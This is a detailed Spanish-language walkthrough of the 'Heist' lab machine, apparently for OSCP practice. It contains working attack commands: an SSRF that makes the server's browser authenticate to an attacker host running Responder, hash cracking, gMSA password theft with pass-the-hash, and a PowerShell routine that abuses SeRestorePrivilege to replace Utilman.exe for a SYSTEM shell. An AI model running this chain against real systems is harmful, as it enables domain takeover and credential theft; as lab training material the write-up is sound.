# Máquina "Heist" — Writeup detallado (OSCP / PG)

**Objetivo:** 192.168.180.165 (Domain Controller, dominio `heist.offsec`, host `DC01`, Windows Server 2019)
**Atacante (Kali):** 192.168.45.155 (tun0, VPN del lab)

Resumen de la cadena:
**SSRF en web (8080) → captura NetNTLMv2 → crackeo → WinRM como `enox` → lectura de gMSA `svc_apache$` → abuso de `SeRestorePrivilege` → SYSTEM.**

---

## 0. Conceptos base (para que todo lo demás tenga sentido)

- **Net-NTLMv2 (o "hash NTLM de red"):** cuando una máquina Windows intenta autenticarse contra OTRO equipo (por SMB, HTTP, etc.), manda una "prueba" criptográfica de su contraseña. No es la contraseña ni el hash guardado en disco, es un *hash de red* que se puede **crackear offline** o usar en ataques de relay. Capturarlo = conseguir (potencialmente) la contraseña de ese usuario.
- **Responder:** una herramienta que levanta servidores falsos (SMB, HTTP, etc.) en tu Kali. Cuando una víctima intenta autenticarse contra ti, Responder le "sigue el juego", le pide autenticación y **guarda el Net-NTLMv2** que la víctima envía.
- **Forced authentication / SSRF:** engañar a un servidor para que **él** se conecte a una dirección que tú controlas. Si consigues que un servidor Windows se conecte a tu Responder, suelta su hash de red.

---

## 1. Reconocimiento

```bash
nmap -sCV -p- 192.168.180.165 -oN heist_full.txt
```

Puertos clave: 53, 88, 389, 445, 636, 3268/3269, 3389 (RDP), **5985 (WinRM)**, 9389 → **es un Domain Controller**. Y además:

- **8080/tcp → http-proxy** (una web).

### ¿Por qué `nc` al 8080 "no mostraba nada"?

```bash
nc 192.168.180.165 8080   # no muestra nada
```

Netcat abre la conexión TCP pero **no envía ninguna petición**. Un servidor HTTP no "habla" hasta que le mandas una petición válida (`GET / HTTP/1.1...`). Por eso parece que no hay nada. La forma correcta de ver una web desde terminal es **curl**:

```bash
curl -s -i http://192.168.180.165:8080/
```

Eso devolvió:
- `Server: Werkzeug/2.0.1 Python/3.9.0` → es una app **Flask** (Python).
- El HTML tenía un formulario con un campo `name="url"` → **"Secure Web Browser"**: tú le das una URL y **el servidor la visita por ti**. Eso es justo lo que necesitamos para forzar autenticación.

---

## 2. Foothold: capturar el Net-NTLMv2 (la parte que te lió)

### El vector real

La web, al meterle una URL, **lanza un Chromium headless en el servidor** que visita esa dirección. La idea: hacer que visite **nuestro Kali** para que el Windows suelte su hash de red contra Responder.

### Por qué el UNC (`\\IP\algo`) NO funcionó y el HTTP SÍ

Al principio probaste con una ruta UNC tipo `\\192.168.45.155\test`. Eso **no disparó nada** porque:

- **Chromium NO sabe hablar SMB/UNC.** Un navegador solo entiende `http://`, `https://`, etc. Cuando le das `\\ip\...`, no hace una conexión SMB (que es lo que capturaría Responder por el puerto 445). Por eso veías la página del dinosaurio: Chromium intentó "navegar" a esa ruta y falló.
- El UNC sí funcionaría si el que abre la ruta fuera el **Explorador de Windows** o un cliente SMB, pero aquí es un **navegador**.

La solución fue apuntarlo a una **URL HTTP** hacia tu Kali:

```bash
# Responder levantado antes (ver abajo)
curl -s -G "http://192.168.180.165:8080/" --data-urlencode "url=http://192.168.45.155/test"
```

Qué pasa aquí paso a paso:
1. El Chromium del servidor hace un `GET http://192.168.45.155/` (a tu Kali).
2. El **servidor HTTP de Responder** le responde: "para ver esto necesitas autenticarte" (un reto NTLM, código 401).
3. Chromium, al correr en Windows con la sesión de un usuario del dominio (`enox`), **manda automáticamente** las credenciales de ese usuario.
4. Responder captura ese **Net-NTLMv2 de `enox`**.

### El papel REAL del tcpdump (aclaración importante)

Ojo con esto, porque te quedó la idea de que "el tcpdump ayudó a que Responder escuchara" — **no es exactamente así**:

- **tcpdump NO hace que Responder escuche.** Responder escucha por sí solo.
- **tcpdump es solo un "microscopio" de red:** muestra los paquetes que entran y salen por una interfaz. Lo usamos para **comprobar si el servidor objetivo realmente llegaba a tu Kali**.

```bash
sudo tcpdump -i tun0 host 192.168.180.165
```

Lo que de verdad hizo que funcionara fue **cambiar el UNC por una URL HTTP** (por lo de Chromium). El tcpdump solo nos sirvió para **confirmar con nuestros propios ojos** que el objetivo sí nos mandaba tráfico — es decir, que el problema no era de conectividad sino de técnica. Una vez viste paquetes entrando desde `192.168.180.165`, supiste que el vector iba bien y Responder soltó el hash.

Regla mental: **tcpdump = "¿me está llegando algo?"**, **Responder = "captura el hash de lo que me llega"**. Son cosas distintas.

### Verificar que Responder está bien montado

```bash
ip a show tun0          # confirma tu IP de la VPN (192.168.45.155)
sudo responder -I tun0  # SIEMPRE con sudo y con -I <interfaz del lab>
```

En el banner de arranque comprueba que `SMB server [ON]` y `HTTP server [ON]`, y que `Responder IP` es tu IP de tun0. Si no captura nada, lo normal es: o no va con `sudo`, o la interfaz está mal (`eth0` en vez de `tun0`), o el 445 lo tiene ocupado el `smbd` del sistema (se para con `sudo systemctl stop smbd nmbd`).

Hash capturado:
```
enox::HEIST:a5bf2fe6...:5F9F8EF5...:0101000000000000...
```

(Nota: el dominio `HX3C.LOCAL` que aparece dentro del hash es **falso**, lo inventa Responder en su reto. El dominio real lo sacamos después con `nxc`.)

---

## 3. Crackeo del hash

Net-NTLMv2 → hashcat modo **5600**:

```bash
echo 'enox::HEIST:a5bf2fe6...<hash completo>...' > enox.hash
hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt
```

Resultado: **`enox:california`**.

---

## 4. Acceso inicial (user)

```bash
# Validar y sacar el dominio real:
nxc smb 192.168.180.165 -u enox -p 'california'
# (domain:heist.offsec) (name:DC01)

# Shell:
evil-winrm -i 192.168.180.165 -u enox -p 'california'
```

Flag de usuario en `C:\Users\enox\Desktop\local.txt`.

Pista encontrada en el escritorio (`todo.txt`):
```
- Use group managed service account for apache [DONE]
```
→ apunta a una **gMSA** (ver siguiente paso).

> **Aviso lateral:** en medio se cayó la VPN. Señal típica: `ping` responde `Destination Net Unreachable` desde el gateway del lab (`192.168.45.254`), o `nxc` no devuelve nada, o evil-winrm da `Network is unreachable` (ENETUNREACH). Solución: comprobar `ip a show tun0`, reconectar OpenVPN, y si la máquina murió, hacerle **revert** en el portal. Consejo: lanza la VPN y Responder dentro de **`tmux`**, así no se mueren si cierras la terminal.

---

## 5. Movimiento lateral: leer la contraseña de la gMSA

**¿Qué es una gMSA (group Managed Service Account)?** Es una cuenta de servicio cuya contraseña **la gestiona y rota el DC automáticamente** (nadie la sabe). Pero el DC permite que **ciertos usuarios/grupos lean esa contraseña**. Si tú eres uno de ellos, puedes "robarla" (en forma de hash NT).

```bash
nxc ldap 192.168.180.165 -u enox -p 'california' --gmsa
```

Salida:
```
Account: svc_apache$   NTLM: d55523f6caf99b4e8054e9332538c6a1
PrincipalsAllowedToReadPassword: ['DC01$', 'Web Admins']
```

`enox` pertenece al grupo **Web Admins**, que está autorizado a leer la contraseña de `svc_apache$`. Por eso pudimos sacar su **hash NT**.

Ahora nos autenticamos como `svc_apache$` por **pass-the-hash** (usamos el hash, no necesitamos la contraseña en claro):

```bash
# Confirmar la cuenta:
nxc smb 192.168.180.165 -u 'svc_apache$' -H d55523f6caf99b4e8054e9332538c6a1

# Tiene WinRM → shell:
evil-winrm -i 192.168.180.165 -u 'svc_apache$' -H d55523f6caf99b4e8054e9332538c6a1
```

> Intentamos **DCSync** con esta cuenta (`secretsdump.py ... -hashes :d555...`) pero dio `rpc_s_access_denied`: `svc_apache$` **no** tiene permisos de replicación. Así que la escalada va por otro lado.

---

## 6. Escalada a SYSTEM: abuso de SeRestorePrivilege (la otra parte que te lió)

En `C:\Users\svc_apache$\Documents` había un `EnableSeRestorePrivilege.ps1`. Y al mirar los privilegios:

```powershell
whoami /priv
# SeRestorePrivilege   Restore files and directories   Enabled
```

### ¿Qué es SeRestorePrivilege y por qué es "game over"?

Es el privilegio que usan los programas de **backup/restauración** para **escribir CUALQUIER archivo del sistema**, saltándose los permisos (ACLs). Si puedes escribir cualquier fichero, puedes **sobrescribir un programa que se ejecuta como SYSTEM** y ya tienes SYSTEM.

El programa elegido: **`Utilman.exe`**. Es la utilidad de accesibilidad de Windows. Tiene una propiedad muy útil para nosotros: en la **pantalla de login** (antes de meter usuario/contraseña), el botón de "Accesibilidad" lo lanza... **como SYSTEM**. Si cambiamos `Utilman.exe` por una copia de `cmd.exe`, ese botón nos abre una **consola SYSTEM sin necesidad de credenciales**.

### Por qué `copy` y `robocopy` fallaron (y cómo lo resolvimos)

Esta es la parte técnica fina. Tener el privilegio **activo (Enabled) no basta**: el sistema solo lo consulta **cuando el fichero se abre en "modo backup"**. Es decir, el privilegio solo se "enciende" si abres el archivo con una bandera especial llamada `FILE_FLAG_BACKUP_SEMANTICS`.

- **`copy` / `Copy-Item`** abren el fichero en modo **normal** → el kernel ni mira el privilegio → `Access Denied`. (Esto fue lo que te pasó.)
- **`robocopy /B`** sí usa modo backup, PERO exige **dos** privilegios: Backup (`SeBackupPrivilege`) **y** Restore (`SeRestorePrivilege`). Nosotros solo teníamos **Restore**, por eso dio el error `You do not have the Backup and Restore Files user rights`.

La solución fue abrir el fichero nosotros mismos con la bandera de backup, usando **solo SeRestore**, mediante una llamada directa a la API de Windows (`CreateFile`) desde PowerShell. Esto es lo que hizo el bloque que pegaste:

```powershell
$code = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
public class R {
  [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
  public static extern SafeFileHandle CreateFile(string name, uint access, uint share, IntPtr sec, uint create, uint flags, IntPtr template);
  public static void Over(string dst, string src){
    byte[] data = File.ReadAllBytes(src);                 // lee cmd.exe en memoria
    // 0x40000000 = GENERIC_WRITE | 2 = CREATE_ALWAYS (recrea) | 0x02000000 = FILE_FLAG_BACKUP_SEMANTICS
    var h = CreateFile(dst, 0x40000000, 0, IntPtr.Zero, 2, 0x02000000, IntPtr.Zero);
    if(h.IsInvalid) throw new Exception("open failed err=" + Marshal.GetLastWin32Error());
    using(var fs = new FileStream(h, FileAccess.Write)){ fs.Write(data,0,data.Length); } // escribe encima
  }
}
"@
Add-Type -TypeDefinition $code
. C:\Users\svc_apache$\Documents\EnableSeRestorePrivilege.ps1   # activa SeRestore en ESTE proceso
[R]::Over("C:\Windows\System32\Utilman.exe","C:\Windows\System32\cmd.exe")  # cmd.exe -> Utilman.exe
Write-Host "DONE"
```

En cristiano, el bloque:
1. Define una mini-función que abre un fichero **en modo backup** (la bandera `0x02000000`).
2. Activa el privilegio SeRestore en el proceso actual de PowerShell.
3. Lee el contenido de `cmd.exe` y lo **escribe encima de `Utilman.exe`**, saltándose los permisos gracias al modo backup + el privilegio.

> Clave: el "activar privilegio" y la "escritura" tienen que ocurrir en el **mismo proceso** de PowerShell. En evil-winrm todas las líneas corren en la misma sesión, por eso funcionó.

Antes guardamos una copia del original para restaurar luego (leer sí se podía, solo estaba bloqueada la escritura):
```powershell
copy C:\Windows\System32\Utilman.exe C:\Users\svc_apache$\Documents\Utilman.exe.orig
```

Verificación de que el swap funcionó — el tamaño cambió al de `cmd.exe`:
```
dir C:\Windows\System32\Utilman.exe   # ~278528 bytes (antes 113664)
```

### Disparar la consola SYSTEM por RDP

Desde **Kali** (no dentro de evil-winrm):

```bash
xfreerdp /v:192.168.180.165 /cert:ignore /sec:nla:off
```

- `/sec:nla:off` → desactiva **NLA** (Network Level Authentication). NLA te obliga a autenticarte *antes* de ver la pantalla de login; al apagarlo, llegas directo a la **pantalla de login gráfica**.
- En la pantalla de login, abajo a la izquierda, el botón de **Ease of Access / Accesibilidad** → en vez de abrir accesibilidad, abre nuestro `cmd.exe` renombrado → **consola como `nt authority\system`**.

```cmd
whoami                                              # nt authority\system
type C:\Users\Administrator\Desktop\proof.txt       # flag de root
```

### Limpieza (buena práctica)

Restaurar el `Utilman.exe` original, desde evil-winrm:
```powershell
[R]::Over("C:\Windows\System32\Utilman.exe","C:\Users\svc_apache$\Documents\Utilman.exe.orig")
```

---

## 7. Chuleta rápida (comandos de la cadena)

```bash
# Recon web
curl -s -i http://TARGET:8080/

# Capturar hash (Responder + SSRF por HTTP)
sudo responder -I tun0
sudo tcpdump -i tun0 host TARGET                 # solo para verificar tráfico
curl -s -G "http://TARGET:8080/" --data-urlencode "url=http://KALI/test"

# Crackear
hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt

# User
nxc smb TARGET -u enox -p 'california'           # saca el dominio real
evil-winrm -i TARGET -u enox -p 'california'

# gMSA
nxc ldap TARGET -u enox -p 'california' --gmsa   # hash NT de svc_apache$
evil-winrm -i TARGET -u 'svc_apache$' -H <hashNT>

# Privesc SeRestore (ver bloque PowerShell de la sección 6)
xfreerdp /v:TARGET /cert:ignore /sec:nla:off     # -> Ease of Access -> SYSTEM
```

---

## 8. Las 5 lecciones que te llevas

1. **`nc` a un puerto HTTP no muestra nada.** Usa `curl -i` o el navegador para ver webs.
2. **Un navegador no hace SMB/UNC.** Para forzar autenticación contra Responder a través de un navegador, usa una **URL `http://`**, no `\\IP\...`.
3. **tcpdump no captura hashes**, solo te confirma si el tráfico llega. Responder es quien captura. Son herramientas con roles distintos.
4. **Un privilegio activo no es magia:** SeBackup/SeRestore solo se aplican si el fichero se abre en **modo backup** (`FILE_FLAG_BACKUP_SEMANTICS`). `copy` normal no vale.
5. **SeRestore = SYSTEM** vía sobrescribir `Utilman.exe` (o `sethc.exe`) + RDP con **NLA desactivado** + botón de Accesibilidad.
